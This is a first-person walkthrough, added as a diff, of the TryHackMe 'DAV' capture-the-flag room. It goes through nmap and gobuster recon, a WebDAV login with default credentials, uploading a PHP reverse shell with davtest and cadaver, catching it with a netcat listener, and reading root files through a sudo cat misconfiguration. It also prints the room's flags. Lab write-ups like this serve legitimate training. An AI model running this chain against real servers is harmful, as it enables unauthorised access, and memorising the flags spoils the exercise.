@@ -1,1 +1,118 @@
+======================================================================================================================================================
+***THM DAV - Walkthrough***
+======================================================================================================================================================
 
+This is a walkthrough of the DAV room from TryHackMe — rated Easy. I’m documenting what I found, the steps I took, and what I learned along the way, 
+in case if you see it will certainly help solving the lab. ah and this is on ejpt cert exam too .
+
+-----------------------------
+🎯 Target -ip- 10.48.147.10
+----------------------------
+lets start:->
+
+🔍 Recon:-
+---------
+i started start with nmap.
+_________________________________
+>$ nmap -sC -sV -p- 10.48.147.108
+_________________________________
+As result, we can see that the port 80 is open, which is running an Appache with a default page
+
+i put the IP in my browser search bar it opened Appache2 default page.
+i looked for robots.txt just for formality and it was not accesible .Then i used gobuster for directory bruteforce.
+
+>$ gobuster dir -u http://10.48.147.108 -w /usr/share/wordlists/dirb/common.txt
+
+Found a /WebDAV directory. when put in browser search bar it is being protected with auth mechanism.
+
+🔓Gaining Access:-
+-----------------
+The WebDAV login prompted for username/password. Tried default credentials — worked.
+_________________
+| wampp:xamppp  |
+|_______________|
+you too should check out online there are other default credentials available (back to the topic)
+
+after i login succesfully i found password directory where hashes were contain but ignore it they are not usefull in this lab 
+but what important was /webdav directry and .dav because it tells me use davtest .
+
+
+***********
+davtest:->
+***********
+davtest is a tool that checks a WebDAV server for what it will let you do — specifically, which file types it allows you to upload and execute (PHP, 
+ASP, etc).
+It automatically tries uploading test files of various extensions and reports which ones succeed and which get blocked/deleted by the server. 
+Purpose: quickly confirm whether a WebDAV misconfiguration is exploitable before wasting time crafting a payload.
+
+>$ davtest -url http://10.48.147.108/webdav -auth username:password
+______________________________________________________________________
+Output showed PHP uploads were permitted — meaning we could upload a PHP reverse shell and have the server execute it.
+so what we will do is cp /usr/share/webshells/php-reverse-shell . in your current working directry then we will use cadaver. Make sure to change ip and port .
+
+*********
+cadaver->
+*********
+cadaver is a command-line WebDAV client — think of it like an FTP client but for WebDAV. It lets you connect to a WebDAV share and run commands like 
+put (upload), get (download), ls, delete, etc. Purpose: once davtest confirms PHP execution works, cadaver is the tool actually used to push the 
+malicious file onto the server.
+
+>$ cadaver http://10.48.147.108/webdav
+______________________________________
+
+>$ put php-reverse-shell.php
+______________________________
+
+This uploads php-reverse-shell.php (a PHP reverse shell payload) directly into the WebDAV directory, which is also served over HTTP — so visiting the file’s URL triggers it.
+
+🐚Getting a Shell->
+------------------
+
+Started a listener on our attack machine to catch the reverse connection:
+
+>$ nc -lvnp 4444
+________________
+
+Browsed to the uploaded file’s URL to trigger execution:
+
+http://10.48.147.108/webdav/php-reverse-shell.php
+__________________________________________________
+
+The PHP file is executed now go back to our listener, we got a reverse shell.
+
+Stabilized the TTY for a proper interactive shell:(why we did this? because its written there look )
+
+>$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+__________________________________________________
+
+
+Now start look for User Flag-
+go to home directory and then to merlin.
+
+>$ cd /home/merlin
+>$ ls
+>$ cat user.txt
+
+🚩USER Flag: 449b40fe93f78a938523b7e4dcd66d2a
+_______________________________________________
+
+Now main part:-
+
+🪜 Privilege Escalation
+-----------------------
+Checked what commands we could run as root without a password:
+>$ sudo -l
+
+Found
+(ALL)NOPASSWD: /bin/cat .    
+cat can be run as root with no password — a misconfiguration (cat shouldn’t be sudo-able, since it can read any file).
+
+>$ sudo cat /root/root.txt
+
+🚩ROOT Flag: 101101ddc16b0cdf65ba0b8a7af7afa5
+______________________________________________
+
+## Summary ##
+==============
+
+WebDAV directory with default credentials → used davtest to confirm PHP execution was allowed → used cadaver to upload a PHP reverse shell → triggered it via browser → got shell → stabilized TTY → found sudo misconfig allowing /bin/cat as root → read root flag.
